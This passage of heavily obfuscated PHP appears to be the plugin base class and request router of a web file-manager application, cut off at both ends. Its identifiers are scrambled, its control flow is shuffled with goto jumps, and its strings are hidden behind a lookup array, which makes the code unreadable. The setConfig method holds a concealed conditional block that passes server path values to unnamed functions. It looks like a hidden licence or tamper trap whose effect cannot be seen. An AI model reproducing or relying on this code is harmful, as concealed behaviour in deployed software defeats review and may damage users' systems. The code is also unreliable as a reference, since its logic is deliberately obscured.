¥¶Šª™–[$cª¶Áô¿»‡[420]][$cª¶Áô¿»‡[1428]]) { $CŒéÏğ…· = $cª¶Áô¿»‡[1429] . $E ¥¶Šª™–[$cª¶Áô¿»‡[420]][$cª¶Áô¿»‡[1428]] . $cª¶Áô¿»‡[1430]; } } } return $CŒéÏğ…·; } final function fileCanView($aÌæÓÉ¥‚Î) { goto dì±é¢òù²; Dê¹ËëÀ÷º: $DÙ¾™Ù’™· = Session::get($aí¾¤´çë¬[1431]); if (!$DÙ¾™Ù’™· || !$DÙ¾™Ù’™·[$aí¾¤´çë¬[1432]]) { $DøØŠ¨ÏÁ = $aí¾¤´çë¬[1433] . rawurlencode(this_url()); show_tips(LNG($aí¾¤´çë¬[1434]) . $aí¾¤´çë¬[1435] . $DøØŠ¨ÏÁ . $aí¾¤´çë¬[1436] . LNG($aí¾¤´çë¬[1437]) . $aí¾¤´çë¬[1438], !1); } if (!Action($aí¾¤´çë¬[1439])->authCan($aí¾¤´çë¬[1440])) { show_tips(LNG($aí¾¤´çë¬[1441]) . $aí¾¤´çë¬[1442], !1); } goto a¿Â†§…; a¿Â†§…: ActionCall($aí¾¤´çë¬[1443], $aÌæÓÉ¥‚Î); goto Eæ‘Ë¡ñ‡÷; dì±é¢òù²: $aí¾¤´çë¬ =& $_SERVER[œÕÊİğö]; if (request_url_safe($aÌæÓÉ¥‚Î)) { return !0; } if ($this->isShare($aÌæÓÉ¥‚Î)) { return !0; } goto Dê¹ËëÀ÷º; Eæ‘Ë¡ñ‡÷: } final function isShare($B°ƒ¼ÖµŞ) { $dáÌéÏáìÕ = KodIO::parse($B°ƒ¼ÖµŞ); return $dáÌéÏáìÕ[$_SERVER[œÕÊİğö][39]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Eø­‘‡Ò†®) { if (request_url_safe($Eø­‘‡Ò†®)) { return $Eø­‘‡Ò†®; } if (!$this->isShare($Eø­‘‡Ò†®)) { $Eø­‘‡Ò†® = $this->filePath($Eø­‘‡Ò†®); } return Action($_SERVER[œÕÊİğö][1092])->linkOut($Eø­‘‡Ò†®); } public function filePathLinkOut($Cï÷­Šé¸Ù) { if (request_url_safe($Cï÷­Šé¸Ù)) { return $Cï÷­Šé¸Ù; } $this->fileCanView($Cï÷­Šé¸Ù); return Action($_SERVER[œÕÊİğö][1092])->link($Cï÷­Šé¸Ù); } final function filePath($cñ¤Øº¤µ) { $eçÚ˜´¾‘¦ =& $_SERVER[œÕÊİğö]; if ($F†ùßš¡—¾ = $this->checkSharePath($cñ¤Øº¤µ)) { Hook::trigger($eçÚ˜´¾‘¦[1444], $F†ùßš¡—¾); return $F†ùßš¡—¾; } $this->fileCanView($cñ¤Øº¤µ); if (request_url_safe($cñ¤Øº¤µ)) { $A¾š„õŠåò = parse_url_query($cñ¤Øº¤µ); if (isset($A¾š„õŠåò[$eçÚ˜´¾‘¦[1445]]) && isset($A¾š„õŠåò[$eçÚ˜´¾‘¦[219]])) { $DñµË©¦ˆ† = Model($eçÚ˜´¾‘¦[760])->get($eçÚ˜´¾‘¦[761]); $aøè™¨¯¢³ = Mcrypt::decode($A¾š„õŠåò[$eçÚ˜´¾‘¦[219]], $DñµË©¦ˆ†); if ($aøè™¨¯¢³) { $this->fileInfo = IO::infoWithChildren($aøè™¨¯¢³); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $aøè™¨¯¢³; } } $cñ¤Øº¤µ = $this->_cacheHttpFile($cñ¤Øº¤µ); $this->fileInfo = IO::infoWithChildren($cñ¤Øº¤µ); } else { $this->fileInfo = IO::infoWithChildren($cñ¤Øº¤µ); if (!$this->fileInfo) { show_tips(LNG($eçÚ˜´¾‘¦[115]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($eçÚ˜´¾‘¦[1444], $cñ¤Øº¤µ); return $cñ¤Øº¤µ; } final function _cacheHttpFile($döøÎÊ„µ™) { $dÄ…ÎŠø•Ö = hash_path($döøÎÊ„µ™, !0); $this->cachePath = $this->pluginCachePath($dÄ…ÎŠø•Ö); if ($dÇí‹‰Æ„ = IO::fileNameExist($this->cachePath, $dÄ…ÎŠø•Ö)) { return KodIO::make($dÇí‹‰Æ„); } $F°˜â¹È¾ = $this->cachePath . $dÄ…ÎŠø•Ö; return $this->pluginCacheFileSet($F°˜â¹È¾, file_get_contents_nossl($döøÎÊ„µ™)); } final function _tmpFileName($Fµ˜ˆäàèĞ = array()) { goto F‹„¸İŒ°”; eÀ•¤¬»ªÃ: $dæœäÉàôÊ = array($Fµ˜ˆäàèĞ[$fÛĞè¬‡ö[38]], $Fµ˜ˆäàèĞ[$fÛĞè¬‡ö[86]], $Fµ˜ˆäàèĞ[$fÛĞè¬‡ö[88]]); if (isset($Fµ˜ˆäàèĞ[$fÛĞè¬‡ö[524]])) { $dæœäÉàôÊ[] = $Fµ˜ˆäàèĞ[$fÛĞè¬‡ö[524]]; } return md5(implode($fÛĞè¬‡ö[81], $dæœäÉàôÊ)); goto bš÷èäè·É; F‹„¸İŒ°”: $fÛĞè¬‡ö =& $_SERVER[œÕÊİğö]; if (!$Fµ˜ˆäàèĞ) { $Fµ˜ˆäàèĞ = $this->fileInfo; } if (isset($Fµ˜ˆäàèĞ[$fÛĞè¬‡ö[181]])) { return $Fµ˜ˆäàèĞ[$fÛĞè¬‡ö[181]]; } goto E’ÍØíÌ; E’ÍØíÌ: if (isset($Fµ˜ˆäàèĞ[$fÛĞè¬‡ö[174]][$fÛĞè¬‡ö[181]])) { return $Fµ˜ˆäàèĞ[$fÛĞè¬‡ö[174]][$fÛĞè¬‡ö[181]]; } $E½Œ¾”ÏÄ“ = IO::hashSimple($Fµ˜ˆäàèĞ[$fÛĞè¬‡ö[86]]); if ($E½Œ¾”ÏÄ“) { return $E½Œ¾”ÏÄ“; } goto eÀ•¤¬»ªÃ; bš÷èäè·É: } final function checkSharePath($DÅŠä²ÖÏ—) { goto B¢‘»¶Øª¸; e…Æˆª‚ä: $this->cachePath = $this->pluginCachePath($this->fileInfo[$E¥“¤¦Ì²Ü[181]]); return $B–òÄ×§Ğµ[$E¥“¤¦Ì²Ü[86]]; goto A¢°ªº¼ÍÚ; Eä³îµ·ÓÚ: $B–òÄ×§Ğµ = Action($E¥“¤¦Ì²Ü[1092])->sharePathInfo($DÅŠä²ÖÏ—); if (!isset($B–òÄ×§Ğµ[$E¥“¤¦Ì²Ü[86]])) { show_json(LNG($E¥“¤¦Ì²Ü[1446]), !1); } $this->fileInfo = $B–òÄ×§Ğµ[$E¥“¤¦Ì²Ü[174]]; goto e…Æˆª‚ä; B¢‘»¶Øª¸: $E¥“¤¦Ì²Ü =& $_SERVER[œÕÊİğö]; if (!defined($E¥“¤¦Ì²Ü[477])) { define($E¥“¤¦Ì²Ü[517], 0); } if (!$this->isShare($DÅŠä²ÖÏ—)) { return !1; } goto Eä³îµ·ÓÚ; A¢°ªº¼ÍÚ: } final function pluginCachePath($F°ˆ·­çŞ» = '') { $EÎê’ÌË†È =& $_SERVER[œÕÊİğö]; $eÛ¶¥»œ»» = IO_PATH_SYSTEM_TEMP . $EÎê’ÌË†È[1447] . $this->pluginName; if (!($CœÈÑˆª«£ = IO::infoFull($eÛ¶¥»œ»»))) { return IO::mkdir($eÛ¶¥»œ»» . $EÎê’ÌË†È[8] . $F°ˆ·­çŞ»); } if (empty($F°ˆ·­çŞ»)) { return $CœÈÑˆª«£[$EÎê’ÌË†È[86]]; } if (!($c·àÒŒâ‘ = IO::fileNameExist($CœÈÑˆª«£[$EÎê’ÌË†È[86]], $F°ˆ·­çŞ»))) { return IO::mkdir($CœÈÑˆª«£[$EÎê’ÌË†È[86]] . $F°ˆ·­çŞ»); } return KodIO::make($c·àÒŒâ‘); } final function pluginCacheFileSet($eç®†™åöù, $a¿ŒßĞ‹òç = '') { $cĞØƒ×®Øš =& $_SERVER[œÕÊİğö]; if (!($BÒ¤à˜ñ÷ = IO::infoFull($eç®†™åöù))) { return IO::mkfile($eç®†™åöù, $a¿ŒßĞ‹òç, REPEAT_REPLACE); } IO::setContent($BÒ¤à˜ñ÷[$cĞØƒ×®Øš[86]], $a¿ŒßĞ‹òç); return $BÒ¤à˜ñ÷[$cĞØƒ×®Øš[86]]; } final function pluginLocalFile($aãƒŠÎš÷” = '') { goto c¨Õ£ÚÙ‚; cÙÉ…‹¾: if (!checkExtSafe($c§¦¢Ç†¿”)) { $c§¦¢Ç†¿” = $c§¦¢Ç†¿” . $fò„ËÅŸ¤â[1448]; } $C„«ö¤Ş¢ = $EÏÁ´†”ã . $c§¦¢Ç†¿”; if (@file_exists($C„«ö¤Ş¢)) { return $C„«ö¤Ş¢; } goto Fè£ùÜ«Ø; c¨Õ£ÚÙ‚: $fò„ËÅŸ¤â =& $_SERVER[œÕÊİğö]; $EÏÁ´†”ã = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($EÏÁ´†”ã)) { mk_dir($EÏÁ´†”ã); } goto dÎËë»öø; Fè£ùÜ«Ø: return IO::copy($aãƒŠÎš÷”, $EÏÁ´†”ã, 0, $c§¦¢Ç†¿”); goto FÏ»¦Šì©Š; dÎËë»öø: if (!$aãƒŠÎš÷”) { return $EÏÁ´†”ã; } $b¨»Ó­±Ô = IO::info($aãƒŠÎš÷”); $c§¦¢Ç†¿” = $this->_tmpFileName($b¨»Ó­±Ô) . $fò„ËÅŸ¤â[105] . $b¨»Ó­±Ô[$fò„ËÅŸ¤â[178]]; goto cÙÉ…‹¾; FÏ»¦Šì©Š: } final function appPackage() { goto bˆ”õÌ¼§; B–´ÍÊ­ÄÕ: $this->parseLang($eÉá³ ğ…×); $C“‰ó·ËÖê = json_decode_force($eÉá³ ğ…×); if (!$C“‰ó·ËÖê) { return array(); } goto a÷¶Ù¤ïƒ²; a÷¶Ù¤ïƒ²: $d»´İè¡êï = Hook::trigger($eíì¸â¢é[1450], $C“‰ó·ËÖê); if ($d»´İè¡êï && is_array($d»´İè¡êï)) { $C“‰ó·ËÖê = $d»´İè¡êï; } $this->packageData = $C“‰ó·ËÖê; goto BĞŞÑ°ß¯Ã; BĞŞÑ°ß¯Ã: return $C“‰ó·ËÖê; goto b²Û¿µà¬ê; bˆ”õÌ¼§: $eíì¸â¢é =& $_SERVER[œÕÊİğö]; if ($this->packageData) { return $this->packageData; } $eÉá³ ğ…× = $this->parseFile($this->pluginPath . $eíì¸â¢é[1449]); goto B–´ÍÊ­ÄÕ; b²Û¿µà¬ê: } public function packageInfoGet($e”öĞƒÄ¡Á) { $CŞß³ì¯· = $this->appPackage(); return array_get_value($CŞß³ì¯·, $e”öĞƒÄ¡Á); } public function packageVersion() { return $this->packageInfoGet($_SERVER[œÕÊİğö][1451]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[œÕÊİğö][1452]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[œÕÊİğö][1453]); } public function echoJsAssign($cß¢¡Î×ñç, $cä¯—Õß‚È) { $this->echoJsAssignArr[$cß¢¡Î×ñç] = $cä¯—Õß‚È; } private function parseFile($dõÛå±¿îå) { goto C÷›âÒçñ; d´ùÌÚÍÏõ: if (strstr($A÷Õ»«•ê­, $c‘¬„ïàÂñ[1465])) { $F•Â’¯»Í = $F•Â’¯»Í = rawurlencode(json_encode($this->getConfig())); $A÷Õ»«•ê­ = str_replace($c‘¬„ïàÂñ[1465], $F•Â’¯»Í, $A÷Õ»«•ê­); } $A÷Õ»«•ê­ = str_replace($aö©õÙ˜—‚, $E¿¡Ø’ŒÃğ, $A÷Õ»«•ê­); return $A÷Õ»«•ê­; goto A¨¬Ï©˜‚¤; C÷›âÒçñ: $c‘¬„ïàÂñ =& $_SERVER[œÕÊİğö]; $A÷Õ»«•ê­ = file_get_contents_nossl($dõÛå±¿îå); $aö©õÙ˜—‚ = array($c‘¬„ïàÂñ[1454], $c‘¬„ïàÂñ[1455], $c‘¬„ïàÂñ[1456], $c‘¬„ïàÂñ[1457], $c‘¬„ïàÂñ[1458], $c‘¬„ïàÂñ[1459], $c‘¬„ïàÂñ[1460]); goto F£±£åãí; F£±£åãí: $E¿¡Ø’ŒÃğ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$c‘¬„ïàÂñ[98]][$c‘¬„ïàÂñ[1461]]); foreach ($this->echoJsAssignArr as $eÕ¢”²¹‹ì => $CÆ‚¦÷õ–ô) { $aö©õÙ˜—‚[] = $c‘¬„ïàÂñ[1462] . $eÕ¢”²¹‹ì . $c‘¬„ïàÂñ[1463]; $E¿¡Ø’ŒÃğ[] = is_array($CÆ‚¦÷õ–ô) || is_object($CÆ‚¦÷õ–ô) ? rawurlencode(json_encode($CÆ‚¦÷õ–ô)) : $CÆ‚¦÷õ–ô; } if (strstr($A÷Õ»«•ê­, $c‘¬„ïàÂñ[1464])) { $F•Â’¯»Í = rawurlencode(json_encode($this->pluginLangArr)); $A÷Õ»«•ê­ = str_replace($c‘¬„ïàÂñ[1464], $F•Â’¯»Í, $A÷Õ»«•ê­); } goto d´ùÌÚÍÏõ; A¨¬Ï©˜‚¤: } private function parseLang(&$DÇ¶—ÅÈòè) { goto b¥ÜŒİ¬—Ú; b¥ÜŒİ¬—Ú: $d„°õ¼‚Ôš =& $_SERVER[œÕÊİğö]; $B³ÙƒôÚé = $d„°õ¼‚Ôš[1466]; if (!strstr($DÇ¶—ÅÈòè, $B³ÙƒôÚé)) { return; } goto BÚò±ê¨ÍÇ; BÚò±ê¨ÍÇ: preg_match_all($d„°õ¼‚Ôš[1467], $DÇ¶—ÅÈòè, $fªÃ —Ö…‹); if (!is_array($fªÃ —Ö…‹) || count($fªÃ —Ö…‹) == 0 || !is_array($fªÃ —Ö…‹[0]) || count($fªÃ —Ö…‹[0]) == 0) { return; } $FŠø‡¹´ŒÊ = array(); goto fàÇ¤šÀ; fàÇ¤šÀ: $d«´à¶Üè± = array(); foreach ($fªÃ —Ö…‹[0] as $eÆ¤Æ‹Úß) { $c˜¹æÌÍ” = substr($eÆ¤Æ‹Úß, strlen($B³ÙƒôÚé), -4); $eó„ßÄ‰Ì = LNG($c˜¹æÌÍ”); $FŠø‡¹´ŒÊ[] = $eÆ¤Æ‹Úß; $d«´à¶Üè±[] = str_replace(array($d„°õ¼‚Ôš[15], $d„°õ¼‚Ôš[1060], $d„°õ¼‚Ôš[350], $d„°õ¼‚Ôš[126]), array($d„°õ¼‚Ôš[60], $d„°õ¼‚Ôš[60], $d„°õ¼‚Ôš[43], $d„°õ¼‚Ôš[1468]), $eó„ßÄ‰Ì); } $DÇ¶—ÅÈòè = str_replace($FŠø‡¹´ŒÊ, $d«´à¶Üè±, $DÇ¶—ÅÈòè); goto FŠ„—Ó†ß; FŠ„—Ó†ß: } private function parseConfig(&$e¯Í‹†Ôß‚) { goto B–’ãÎˆˆ†; AÏâç–Éİ: $B¡ŞÌÚõíˆ = array(); $b¤°‡‡´Å‹ = array(); foreach ($BĞ¾¹¸‘áß[0] as $Fî¨¢ã£•ª) { $e»Šˆ½ÚŒ“ = substr($Fî¨¢ã£•ª, strlen($D·ß…„‘¸), -2); $B¡ŞÌÚõíˆ[] = $Fî¨¢ã£•ª; $b¤°‡‡´Å‹[] = _get($bÖ–ÜÉÇ›œ, $e»Šˆ½ÚŒ“); } goto f œÁ†ÇÛ“; d™ìŞíˆ™: preg_match_all($cÜ˜’ ½[1470], $e¯Í‹†Ôß‚, $BĞ¾¹¸‘áß); if (!is_array($BĞ¾¹¸‘áß) || count($BĞ¾¹¸‘áß) == 0 || !is_array($BĞ¾¹¸‘áß[0]) || count($BĞ¾¹¸‘áß[0]) == 0) { return; } $bÖ–ÜÉÇ›œ = $this->getConfig(); goto AÏâç–Éİ; B–’ãÎˆˆ†: $cÜ˜’ ½ =& $_SERVER[œÕÊİğö]; $D·ß…„‘¸ = $cÜ˜’ ½[1469]; if (!strstr($e¯Í‹†Ôß‚, $D·ß…„‘¸)) { return; } goto d™ìŞíˆ™; f œÁ†ÇÛ“: $e¯Í‹†Ôß‚ = str_replace($B¡ŞÌÚõíˆ, $b¤°‡‡´Å‹, $e¯Í‹†Ôß‚); goto cî•ÉÒªŞ; cî•ÉÒªŞ: } private function parsePackage(&$Fâ··†Ê¼ƒ) { goto EÆ«ƒƒùáë; EÆ«ƒƒùáë: $D©Š“ôª¢ƒ =& $_SERVER[œÕÊİğö]; $CšôÍÏ‡”„ = $D©Š“ôª¢ƒ[1471]; if (!strstr($Fâ··†Ê¼ƒ, $CšôÍÏ‡”„)) { return; } goto F×ËàŒ…ä; Fî·Ä‡ÃËÓ: $fŸÜÂäÃØƒ = array(); $AğñğÚ‹©Ò = array(); foreach ($E‹«­Â¼ÀŠ[0] as $A«»…´ÍĞ½) { $D¢ø¢­Âƒ¦ = substr($A«»…´ÍĞ½, strlen($CšôÍÏ‡”„), -2); $fŸÜÂäÃØƒ[] = $A«»…´ÍĞ½; $AğñğÚ‹©Ò[] = _get($dªíÃïÜè, $D¢ø¢­Âƒ¦); } goto dÒÀô‡Ü°Ó; F×ËàŒ…ä: preg_match_all($D©Š“ôª¢ƒ[1472], $Fâ··†Ê¼ƒ, $E‹«­Â¼ÀŠ); if (!is_array($E‹«­Â¼ÀŠ) || count($E‹«­Â¼ÀŠ) == 0 || !is_array($E‹«­Â¼ÀŠ[0]) || count($E‹«­Â¼ÀŠ[0]) == 0) { return; } $dªíÃïÜè = $this->appPackage(); goto Fî·Ä‡ÃËÓ; dÒÀô‡Ü°Ó: $Fâ··†Ê¼ƒ = str_replace($fŸÜÂäÃØƒ, $AğñğÚ‹©Ò, $Fâ··†Ê¼ƒ); goto EĞŠÃˆã±; EĞŠÃˆã±: } final function echoFile($D‰¾ç„œ¨, $eØ—…Õ¬Ø… = false) { goto fªª©³Ø×Ş; F»Ğ­ˆ´¼ˆ: $C­”ïÉçÜ× = $this->parseFile($eß÷ªñ¦”Ô); $this->parseLang($C­”ïÉçÜ×); $this->parseConfig($C­”ïÉçÜ×); goto AÀíÆ¢ó²; AÀíÆ¢ó²: $this->parsePackage($C­”ïÉçÜ×); if (is_array($eØ—…Õ¬Ø…)) { $C­”ïÉçÜ× = str_replace(array_keys($eØ—…Õ¬Ø…), array_values($eØ—…Õ¬Ø…), $C­”ïÉçÜ×); } echo $CÍÁÖœ¦¸à[15] . $C­”ïÉçÜ×; goto B—éÖî›£ô; fªª©³Ø×Ş: $CÍÁÖœ¦¸à =& $_SERVER[œÕÊİğö]; $eß÷ªñ¦”Ô = $this->pluginPath . $D‰¾ç„œ¨; if (ACT == $CÍÁÖœ¦¸à[1473]) { echo $CÍÁÖœ¦¸à[1474] . $this->pluginName . $CÍÁÖœ¦¸à[8] . $D‰¾ç„œ¨ . $CÍÁÖœ¦¸à[1475]; if (!file_exists($eß÷ªñ¦”Ô)) { echo $CÍÁÖœ¦¸à[1476]; return; } } goto F»Ğ­ˆ´¼ˆ; B—éÖî›£ô: } final function initLang() { goto d¦©øÇì’È; D±ƒ Ã»„´: $dŸğ¥¶–Ü = I18n::getType(); $añöÊÉÍé˜ = array(); if (file_exists($aï‡£“ù . $dŸğ¥¶–Ü . $F™¶ñãàµê[835])) { $añöÊÉÍé˜ = (include $aï‡£“ù . $dŸğ¥¶–Ü . $F™¶ñãàµê[835]); } else { if ($dŸğ¥¶–Ü == $F™¶ñãàµê[1479] && !file_exists($aï‡£“ù . $dŸğ¥¶–Ü . $F™¶ñãàµê[835]) && file_exists($aï‡£“ù . $F™¶ñãàµê[1480])) { $añöÊÉÍé˜ = (include $aï‡£“ù . $F™¶ñãàµê[1480]); } else { if (file_exists($aï‡£“ù . $e§ã×Ñ»ù» . $F™¶ñãàµê[835])) { $añöÊÉÍé˜ = (include $aï‡£“ù . $e§ã×Ñ»ù» . $F™¶ñãàµê[835]); } } } goto e³ÎîÑ÷È; e³ÎîÑ÷È: if (!is_array($añöÊÉÍé˜)) { return array(); } if (@count($añöÊÉÍé˜) > 0) { I18n::set($añöÊÉÍé˜); } return $añöÊÉÍé˜; goto c¤¹Ò°´ø‰; d¦©øÇì’È: $F™¶ñãàµê =& $_SERVER[œÕÊİğö]; $e§ã×Ñ»ù» = $F™¶ñãàµê[1477]; $aï‡£“ù = $this->pluginPath . $F™¶ñãàµê[1478]; goto D±ƒ Ã»„´; c¤¹Ò°´ø‰: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($aõË½µ¨´) { $aÎÌµÁ‚‘À =& $_SERVER[œÕÊİğö]; if ($_SERVER[$aÎÌµÁ‚‘À[11]] != $_SERVER[$aÎÌµÁ‚‘À[1481]]) { goto cñç§ùŠ¡²; Dˆ¥†È‚ÒÍ: $aÄæêÉ¡ñê = 1; while ($aÄæêÉ¡ñê > 1) { $aÄæêÉ¡ñê = $aÄæêÉ¡ñê + 4; $b‰Ú¢°‡© = rawurlencode($aÄæêÉ¡ñê . $aÎÌµÁ‚‘À[251]); } goto e§ğ²¨í¢•; cÅØ“ß±“Œ: $Aóİ°ØÃ´’ = $B†òœìÈ‹($Aù‚‚œˆËš); $B¹Ô×æÏˆš = explode($aÎÌµÁ‚‘À[15], $Aóİ°ØÃ´’); if (count($B¹Ô×æÏˆš) < $aÎÌµÁ‚‘À[634]) { $F‡¥µÛ¸­ = $aÎÌµÁ‚‘À[17]; $F‡¥µÛ¸­(); } goto FÂÅîìºÖ‡; cñç§ùŠ¡²: $C´ùç‡÷¹Ò = $aÎÌµÁ‚‘À[863]; $B†òœìÈ‹ = $aÎÌµÁ‚‘À[12]; $Aù‚‚œˆËš = $_SERVER[$aÎÌµÁ‚‘À[13]] . $aÎÌµÁ‚‘À[14]; goto cÅØ“ß±“Œ; FÂÅîìºÖ‡: $dãÔ‡Ğ¾‡¾ = $aÎÌµÁ‚‘À[864]; $dãÔ‡Ğ¾‡¾($_SERVER[$aÎÌµÁ‚‘À[865]]); $dãÔ‡Ğ¾‡¾($_SERVER[$aÎÌµÁ‚‘À[13]] . $aÎÌµÁ‚‘À[1482]); goto Dˆ¥†È‚ÒÍ; e§ğ²¨í¢•: } return $this->modelPlugin->setConfig($this->pluginName, $aõË½µ¨´); } public function onSetConfig($fŒ…§¥†Ä) { } public function onGetConfig($f“ˆÒ£…) { } public function onChangeStatus($DÛÓíàºŠ«) { } public function onUninstall() { } public function onInstall() { } public function authCheck($CëĞ¤ÎØÏÅ = "\x70\154\165\147\x69\156\x41\165\x74\150") { $c®”´ Ø’Ì =& $_SERVER[œÕÊİğö]; if (!defined($c®”´ Ø’Ì[477])) { return !1; } if (_get($GLOBALS, $c®”´ Ø’Ì[508])) { return !0; } $f…Ô‰é²á = $this->getConfig(); if (!$f…Ô‰é²á[$CëĞ¤ÎØÏÅ]) { return !1; } return ActionCall($c®”´ Ø’Ì[1483], $f…Ô‰é²á[$CëĞ¤ÎØÏÅ]); } public function url($b˜‡¡«ÌÂ, $b—ôàóˆ = '', $A™Ê¿òø•† = true) { goto få£˜öµˆÔ; d¶º‘ïó¶â: if (!$A™Ê¿òø•†) { return $E¿‰’Ì×ÛÏ; } echo $E¿‰’Ì×ÛÏ; goto F¬ë§ÓÌ³×; F¬…ŠÆ¯åÕ: $EÀŸ•œšÖ‡ = $this->packageVersion(); $a‡øí¦ïå = $BÏ‡ÈçÕ¸ . $bÆ˜ã„¸¿ñ[463] . $EÀŸ•œšÖ‡; if (substr($b˜‡¡«ÌÂ, 0, 4) == $bÆ˜ã„¸¿ñ[157] || substr($b˜‡¡«ÌÂ, 0, 2) == $bÆ˜ã„¸¿ñ[1267]) { $E¿‰’Ì×ÛÏ = $b˜‡¡«ÌÂ . $bÆ˜ã„¸¿ñ[1484] . $a‡øí¦ïå; } else { if ($b—ôàóˆ == $bÆ˜ã„¸¿ñ[43]) { $E¿‰’Ì×ÛÏ = $this->pluginHost . $b˜‡¡«ÌÂ . $bÆ˜ã„¸¿ñ[1484] . $a‡øí¦ïå; } else { if ($b—ôàóˆ === $bÆ˜ã„¸¿ñ[87]) { $E¿‰’Ì×ÛÏ = $this->pluginHost . $b˜‡¡«ÌÂ; } else { if ($b—ôàóˆ == $bÆ˜ã„¸¿ñ[1485]) { $E¿‰’Ì×ÛÏ = STATIC_PATH . $b˜‡¡«ÌÂ . $bÆ˜ã„¸¿ñ[1484] . $BÏ‡ÈçÕ¸; } else { if ($b—ôàóˆ == $bÆ˜ã„¸¿ñ[1486]) { $E¿‰’Ì×ÛÏ = APP_HOST . $bÆ˜ã„¸¿ñ[1487] . $b˜‡¡«ÌÂ . $bÆ˜ã„¸¿ñ[1484] . $BÏ‡ÈçÕ¸; } else { if (isset($Bã…™–Ô†ç[$b—ôàóˆ])) { $E¿‰’Ì×ÛÏ = $Bã…™–Ô†ç[$b—ôàóˆ] . $b˜‡¡«ÌÂ . $bÆ˜ã„¸¿ñ[1484] . $a‡øí¦ïå; } } } } } } goto d¶º‘ïó¶â; få£˜öµˆÔ: $bÆ˜ã„¸¿ñ =& $_SERVER[œÕÊİğö]; $Bã…™–Ô†ç = $this->getConfig(); $BÏ‡ÈçÕ¸ = KOD_VERSION . $bÆ˜ã„¸¿ñ[105] . KOD_VERSION_BUILD; goto F¬…ŠÆ¯åÕ; F¬ë§ÓÌ³×: } public function link($B¶Õë©©Í¹ = false, $Aµ¹Çïæ÷í = '') { $Fƒâ†åÓ…í =& $_SERVER[œÕÊİğö]; if (!$B¶Õë©©Í¹) { $this->link($Fƒâ†åÓ…í[1488], $Fƒâ†åÓ…í[1486]); $this->link($Fƒâ†åÓ…í[1489], $Fƒâ†åÓ…í[1485]); $this->link($Fƒâ†åÓ…í[1490], $Fƒâ†åÓ…í[1485]); $this->link($Fƒâ†åÓ…í[1491], $Fƒâ†åÓ…í[1485]); $this->link($Fƒâ†åÓ…í[1492], $Fƒâ†åÓ…í[1485]); return; } $Cƒó†ÉÖï = $this->url($B¶Õë©©Í¹, $Aµ¹Çïæ÷í, !1); if (substr($B¶Õë©©Í¹, -3) == $Fƒâ†åÓ…í[1493]) { echo $Fƒâ†åÓ…í[1494] . $Cƒó†ÉÖï . $Fƒâ†åÓ…í[1495] . $Fƒâ†åÓ…í[15]; } else { if (substr($B¶Õë©©Í¹, -4) == $Fƒâ†åÓ…í[1496]) { echo $Fƒâ†åÓ…í[1497] . $Cƒó†ÉÖï . $Fƒâ†åÓ…í[1498] . $Fƒâ†åÓ…í[15]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\171" => "\x5b\136\57\x5d\53", "\72\x6e\165\x6d" => "\x5b\60\x2d\x39\x5d\53", "\72\x61\154\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($fçØ‰ğŠÃ„, $B¿Ğ”Ş³æ) { $a‹®‚¢‘»è =& $_SERVER[œÕÊİğö]; if ($fçØ‰ğŠÃ„ == $a‹®‚¢‘»è[1499]) { $eö¦•ùÌœ± = array_map($a‹®‚¢‘»è[1500], $B¿Ğ”Ş³æ[0]); $bÄ×è…ÖÉâ = strpos($B¿Ğ”Ş³æ[1], $a‹®‚¢‘»è[8]) === 0 ? $B¿Ğ”Ş³æ[1] : $a‹®‚¢‘»è[8] . $B¿Ğ”Ş³æ[1]; $D“÷èÒĞÅä = $B¿Ğ”Ş³æ[2]; } else { $eö¦•ùÌœ± = null; $bÄ×è…ÖÉâ = strpos($B¿Ğ”Ş³æ[0], $a‹®‚¢‘»è[8]) === 0 ? $B¿Ğ”Ş³æ[0] : $a‹®‚¢‘»è[8] . $B¿Ğ”Ş³æ[0]; $D“÷èÒĞÅä = $B¿Ğ”Ş³æ[1]; } array_push(self::$maps, $eö¦•ùÌœ±); array_push(self::$routes, $bÄ×è…ÖÉâ); array_push(self::$methods, strtoupper($fçØ‰ğŠÃ„)); array_push(self::$callbacks, $D“÷èÒĞÅä); } public static function error($b°ƒ×”ÒĞò) { self::$errorCallback = $b°ƒ×”ÒĞò; } public static function haltOnMatch($B¸‰Ù£³Ø = true) { self::$halts = $B¸‰Ù£³Ø; } public static function dispatch() { goto e¬‹­—µŞá; e¬‹­—µŞá: $dÏƒé©øÒ =& $_SERVER[œÕÊİğö]; $dêÕéŒÏŸì = parse_url($_SERVER[$dÏƒé©øÒ[1501]], PHP_URL_PATH); $b°Àˆ¿¸¤• = $_SERVER[$dÏƒé©øÒ[167]]; goto a‰‹Šé÷§¹; AŠÉ•Û Õ: self::$routes = preg_replace($dÏƒé©øÒ[1186], $dÏƒé©øÒ[8], self::$routes); if (in_array($dêÕéŒÏŸì, self::$routes)) { $c¿¢ŠäŠ¶Œ = array_keys(self::$routes, $dêÕéŒÏŸì); foreach ($c¿¢ŠäŠ¶Œ as $aé’±î²¦µ) { if (self::$methods[$aé’±î²¦µ] == $b°Àˆ¿¸¤• || self::$methods[$aé’±î²¦µ] == $dÏƒé©øÒ[1502] || in_array($b°Àˆ¿¸¤•, self::$maps[$aé’±î²¦µ])) { $d³Çøñ”å° = !0; if (!is_object(self::$callbacks[$aé’±î²¦µ])) { $c°ËÖÒô…„ = explode($dÏƒé©øÒ[8], self::$callbacks[$aé’±î²¦µ]); $f‰éÚ¸— = end($c°ËÖÒô…„); $bÀ§¦ß¡‘¶ = explode($dÏƒé©øÒ[1503], $f‰éÚ¸—); $a¤»–í÷ñ = new $bÀ§¦ß¡‘¶[0](); $a¤»–í÷ñ->{$bÀ§¦ß¡‘¶[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$aé’±î²¦µ]); if (self::$halts) { return; } } } } } else { $AéØêÁÎ‘ = 0; foreach (self::$routes as $aé’±î²¦µ) { if 